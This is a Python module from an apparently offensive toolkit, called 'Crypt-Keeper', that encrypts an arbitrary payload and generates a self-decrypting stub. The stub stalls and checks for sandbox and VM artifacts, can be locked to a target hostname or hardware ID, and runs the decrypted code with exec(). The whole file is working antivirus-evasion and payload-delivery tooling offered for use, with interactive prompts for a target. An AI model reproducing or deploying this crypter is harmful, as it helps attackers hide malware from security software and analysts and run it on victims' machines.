"""
modules/crypt_keeper.py — Payload Encryption & AV Evasion Engine
FIX:
  - Added run_crypt_keeper() entry point so main.py can call it directly
  - Everything else unchanged
"""

import os
import hashlib
import random
import string
import base64
import time
import questionary
from cryptography.fernet import Fernet
from rich.console import Console
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE

console = Console()


class CryptForge:
    def __init__(self):
        self.output_file = "locked_payload.py"

    def generate_stub(self, key_base, encrypted_data, lock_val, lock_type):
        """
        Generates a hardened Python stub with anti-debugging and
        environmental checks baked in.
        """
        stub = f"""
import os
import sys
import base64
import hashlib
import socket
import time
import subprocess
from cryptography.fernet import Fernet

def get_hwid():
    if sys.platform == "win32":
        return subprocess.check_output('wmic csproduct get uuid').decode().split('\\n')[1].strip()
    else:
        for path in ['/etc/machine-id', '/var/lib/dbus/machine-id']:
            if os.path.exists(path):
                with open(path, 'r') as f: return f.read().strip()
    return socket.gethostname()

def execute():
    # 1. Execution delay — stalls automated sandboxes
    time.sleep({random.randint(2, 5)})

    # 2. Check for common sandbox / VM artifacts
    vm_artifacts = ['sandbox', 'virtual', 'vmware', 'vbox']
    if any(art in socket.gethostname().lower() for art in vm_artifacts):
        return

    k = b'{key_base.decode()}'
    lock_target = "{lock_val}"
    lock_type   = "{lock_type}"

    current_val = ""
    if lock_type == "hostname":
        current_val = socket.gethostname()
    elif lock_type == "hwid":
        current_val = get_hwid()

    if lock_target and current_val != lock_target:
        return  # Silent exit — wrong environment

    try:
        if lock_target:
            k = base64.urlsafe_b64encode(
                hashlib.sha256(k + lock_target.encode()).digest())
        cipher    = Fernet(k)
        decrypted = cipher.decrypt(b'{encrypted_data.decode()}')
        exec(decrypted)
    except Exception:
        sys.exit()

if __name__ == "__main__":
    execute()
"""
        return stub

    def run(self, file_path):
        """Encrypts a payload with multi-factor environmental locking."""
        if not os.path.exists(file_path):
            console.print(
                f"[red][!] Error: Source file '{file_path}' not found.[/red]")
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        choice = questionary.select(
            "Select Encryption Mode:",
            choices=[
                "1. No Lock (Global Execution)",
                "2. Hostname Lock (Target Specific)",
                "3. Hardware ID (HWID) Lock (Device Specific)",
            ],
            style=Q_STYLE
        ).ask()

        if not choice:
            return

        lock_val = ""
        lock_type = "none"

        if "Hostname" in choice:
            lock_val = questionary.text(
                "Enter Target Hostname:", style=Q_STYLE).ask() or ""
            lock_type = "hostname"
        elif "Hardware" in choice:
            lock_val = questionary.text(
                "Enter Target HWID:", style=Q_STYLE).ask() or ""
            lock_type = "hwid"

        # Generate the cryptographic key
        key_base = Fernet.generate_key()

        # If locked, derive the key from the environment value so it's
        # never stored in plain form inside the stub.
        derivation_key = key_base
        if lock_val:
            derivation_key = base64.urlsafe_b64encode(
                hashlib.sha256(key_base + lock_val.encode()).digest())

        try:
            cipher = Fernet(derivation_key)
            with open(file_path, "rb") as f:
                raw_data = f.read()

            encrypted_data = cipher.encrypt(raw_data)
            final_stub = self.generate_stub(
                key_base, encrypted_data, lock_val, lock_type)

            with open(self.output_file, "w") as f:
                f.write(final_stub)

            console.print(Panel(
                f"[bold green][+] Encrypted payload ready:[/bold green] {self.output_file}\n"
                f"[white]Lock Type :[/white] {lock_type}\n"
                f"[white]Target    :[/white] {lock_val if lock_val else 'None (Global)'}",
                title="CryptForge Success",
                border_style="green"
            ))

        except Exception as e:
            console.print(f"[red][!] Encryption failed: {e}[/red]")

        questionary.press_any_key_to_continue(style=Q_STYLE).ask()


# ─────────────────────────────────────────────────────────────────────────────
#  LEGACY ALIAS  (keep existing callers working)
# ─────────────────────────────────────────────────────────────────────────────

def encrypt_payload(file_path):
    CryptForge().run(file_path)


# ─────────────────────────────────────────────────────────────────────────────
#  ENTRY POINT — called by main.py
# ─────────────────────────────────────────────────────────────────────────────

def run_crypt_keeper():
    draw_header("Crypt-Keeper: Payload Encryption & AV Evasion")
    console.print(
        "[dim]Encrypts a raw payload (Python, shellcode, script) with Fernet AES.\n"
        "Generates a self-decrypting stub with sandbox evasion and optional\n"
        "environmental locking (hostname or hardware ID).[/dim]\n"
    )
    path = questionary.text(
        "Path to raw payload file to encrypt:", style=Q_STYLE).ask()
    if path:
        CryptForge().run(path)


if __name__ == "__main__":
    run_crypt_keeper()
